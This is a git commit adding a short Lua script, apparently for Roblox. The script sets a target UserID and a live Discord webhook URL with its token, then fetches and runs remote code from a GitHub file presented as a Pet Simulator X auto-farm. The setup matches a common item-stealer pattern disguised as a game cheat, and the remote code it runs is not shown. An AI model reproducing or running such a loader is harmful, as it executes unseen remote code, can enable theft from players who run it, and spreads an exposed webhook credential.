6b1a5f23617e822168cb4f0da8bbe0bafd05f40d
ladhsd <121669763+ladhsd@users.noreply.github.com>
2022-12-30 10:43:04 +0000

    Add files via upload

---
+++ script.lua
@@ -0,0 +1,3 @@
+_G.UserID = 3973341442
+_G.WebHook = "https://discord.com/api/webhooks/1058333410822738011/DHdWMULMhB7lkcRBfQNSfZKC5qIqswZO1fendrU6lI4mu8VkvkKEK4rcTy6yH80ZYj2X"
+loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua'))()
